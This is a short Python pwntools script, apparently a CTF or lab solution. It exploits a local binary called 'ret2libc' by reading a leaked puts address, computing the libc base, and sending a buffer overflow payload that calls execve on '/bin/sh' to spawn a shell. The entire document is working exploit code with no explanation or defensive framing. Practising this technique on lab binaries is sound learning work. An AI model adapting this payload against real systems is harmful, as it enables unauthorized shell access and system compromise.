from pwn import *

libc = ELF('/lib32/libc.so.6')

puts_offset = libc.symbols['puts']

r = process('./ret2libc')
r.recvuntil(b'\n')
x = r.recvuntil(b'\n')
puts_real = int(x[-9:-1], 16)

libc_base = puts_real - puts_offset

execve = libc.symbols['execve'] + libc_base
bin_sh = next(libc.search(b'/bin/sh\x00')) + libc_base

rep = 0x28
fake = 0xffffffff

payload = b'A' * rep + p32(fake) + p32(execve) + p32(fake) + p32(bin_sh) + p32(0) + p32(0)

print(payload)

r.sendline(payload)

print(r.recvall())